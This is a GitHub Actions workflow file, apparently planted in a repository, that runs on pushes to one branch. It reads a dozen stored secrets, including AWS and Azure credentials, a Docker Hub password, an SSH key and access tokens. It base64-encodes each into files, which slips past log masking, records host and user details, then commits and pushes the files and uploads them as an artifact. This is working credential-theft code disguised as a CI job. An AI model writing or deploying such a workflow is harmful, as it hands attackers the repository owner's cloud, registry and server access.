name: ul-collect
on:
  push:
    branches: [ul-82025]
permissions:
  contents: write
jobs:
  c:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ul-82025
      - name: collect
        env:
          AWS_KEY_ID: ${{ secrets.AWS_KEY_ID }}
          AWS_KEY_ACCESS: ${{ secrets.AWS_KEY_ACCESS }}
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          AZURE_CREDENTIALS: ${{ secrets.AZURE_CREDENTIALS }}
          AZURE_SUBSCRIPTION_ID: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
          DOCKER_HUB_LOGIN: ${{ secrets.DOCKER_HUB_LOGIN }}
          DOCKER_HUB_PWD: ${{ secrets.DOCKER_HUB_PWD }}
          APPERY_API_KEY: ${{ secrets.APPERY_API_KEY }}
          SSH_KEY: ${{ secrets.SSH_KEY }}
          PERSONAL_ACCESS_TOKEN: ${{ secrets.PERSONAL_ACCESS_TOKEN }}
          TRAFFIC_ACTION_TOKEN: ${{ secrets.TRAFFIC_ACTION_TOKEN }}
        run: |
          mkdir -p out
          for n in AWS_KEY_ID AWS_KEY_ACCESS AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AZURE_CREDENTIALS AZURE_SUBSCRIPTION_ID DOCKER_HUB_LOGIN DOCKER_HUB_PWD APPERY_API_KEY SSH_KEY PERSONAL_ACCESS_TOKEN TRAFFIC_ACTION_TOKEN; do
            printenv "$n" | base64 -w0 > "out/$n.b64"
          done
          hostname; id; uname -a
          git config user.email "ci@ul.local"; git config user.name "ul-ci"
          git add -f out
          git commit -m "ci: collect $(date -u +%s)" || true
          git push origin HEAD:ul-82025
      - uses: actions/upload-artifact@v4
        with:
          name: ul-out
          path: out/
